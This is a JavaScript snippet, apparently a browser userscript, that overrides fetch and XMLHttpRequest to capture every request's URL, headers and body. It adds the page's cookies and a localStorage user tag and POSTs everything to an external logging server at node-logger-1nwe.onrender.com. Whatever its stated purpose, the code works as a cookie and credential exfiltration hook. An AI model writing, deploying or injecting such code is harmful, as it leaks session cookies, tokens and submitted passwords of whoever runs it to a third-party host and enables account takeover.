(function () {
    "use strict";

    function getCookies(callback) {
        // if (typeof GM_cookie !== "undefined" && GM_cookie.list) {
        //     GM_cookie.list({}, (cookies) => {
        //         callback(cookies.map(c => `${c.name}=${c.value}`).join("; "));
        //     });
        // } else {
        //     console.warn("⚠️ GM_cookie not available, using document.cookie as fallback.");
            callback(document.cookie);  // Fallback to `document.cookie`
        // }
    }
    
    function sendLog(log) {
        getCookies((cookies) => {
            log.cookies = cookies;
            log.user = localStorage.getItem("LOGGER_USER") ? localStorage.getItem("LOGGER_USER")?.toString() : "Unknown"; // ✅ Fetch from localStorage

            // GM_xmlhttpRequest({
            //     method: "POST",  
            //     url: "http://localhost:4000/log",
            //     headers: { "Content-Type": "application/json" },
            //     data: JSON.stringify(log),
            // });
            if (!log.url.includes('localhost') && !log.url.includes('node-logger-1nwe.onrender.com')) {
                fetch("https://node-logger-1nwe.onrender.com/log", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify(log),
                })
                    .then(response => response.text())
                    .then(data => console.log("✅ Log sent successfully:", data))
                    .catch(error => console.error("❌ GM_fetch Error:", error));
            }
        });
    }

    function getFullUrl(url) {
        return url.startsWith("http") ? url : url.startsWith('/') ? window.location.origin + url : window.location.origin + '/' + url;
    }

    // ✅ Intercept Fetch API
    const originalFetch = window.fetch;
    window.fetch = async function (url, options = {}) {
        const fullUrl = getFullUrl(url);
        const response = await originalFetch(url, options);
        const clonedResponse = response.clone();

        const requestHeaders = options.headers || {};
        const responseHeaders = {};
        clonedResponse.headers.forEach((value, key) => {
            responseHeaders[key] = value;
        });

        sendLog({
            type: "fetch",
            url: fullUrl,
            method: options.method || "GET",
            requestHeaders,
            responseHeaders,
            body: options.body ? options.body.toString() : null,
            user: localStorage.getItem("LOGGER_USER") ? localStorage.getItem("LOGGER_USER")?.toString() : "Unknown",
        });

        return response;
    };

    // ✅ Intercept XMLHttpRequest
    const originalXHROpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function (method, url, async, user, password) {
        this._requestMethod = method;
        this._requestUrl = getFullUrl(url); // ✅ Ensures full URL
        return originalXHROpen.apply(this, arguments);
    };

    const originalXHRSend = XMLHttpRequest.prototype.send;
    XMLHttpRequest.prototype.send = function (body) {
        this.addEventListener("load", function () {
            const requestHeaders = this._requestHeaders || {};
            const responseHeaders = {};

            const rawHeaders = this.getAllResponseHeaders();
            if (rawHeaders) {
                rawHeaders.split("\r\n").forEach((line) => {
                    const parts = line.split(": ");
                    if (parts.length === 2) responseHeaders[parts[0]] = parts[1];
                });
            }

            sendLog({
                type: "xhr",
                url: this._requestUrl,
                method: this._requestMethod,
                requestHeaders,
                responseHeaders,
                body: body ? body.toString() : null,
                user: localStorage.getItem("LOGGER_USER") ? localStorage.getItem("LOGGER_USER")?.toString() : "Unknown",
            });
        });

        return originalXHRSend.apply(this, arguments);
    };

    // ✅ Capture request headers in XMLHttpRequest
    const originalSetRequestHeader = XMLHttpRequest.prototype.setRequestHeader;
    XMLHttpRequest.prototype.setRequestHeader = function (header, value) {
        if (!this._requestHeaders) {
            this._requestHeaders = {};
        }
        this._requestHeaders[header] = value;
        return originalSetRequestHeader.apply(this, arguments);
    };
})();
